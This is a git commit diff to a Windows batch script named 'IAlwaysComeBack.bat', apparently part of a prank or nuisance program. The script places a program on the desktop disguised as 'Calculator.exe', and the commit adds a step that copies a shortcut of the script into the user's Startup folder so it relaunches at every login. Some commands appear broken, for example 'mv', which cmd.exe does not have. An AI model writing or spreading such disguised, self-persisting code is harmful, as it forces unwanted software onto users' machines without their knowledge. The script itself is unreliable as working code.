ca3750427bf86cd5856f1ee23f6e3b3cf13a446e
Myelin Lennox <118149338+MyelinLennox@users.noreply.github.com>
2025-11-28 01:14:10 -0600

    back2electricboogalo

--- EatMyShortz/IAlwaysComeBack.bat
+++ EatMyShortz/IAlwaysComeBack.bat
@@ -4,5 +4,6 @@ cd "%homepath%\Desktop"
 if exist Calculator.lnk (
 	exit
 ) else (
-	mklink "C:\Users\%USERNAME%\EatMyShortz\a.exe" "%homepath%\Desktop\Calculator.exe"
+	mklink "C:\Users\%username%\EatMyShortz\a.exe" "%homepath%\Desktop\Calculator.exe"
+	mv "C:\Users\%username%\EatMyShortz\IAlwaysComeBack.bat.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 )
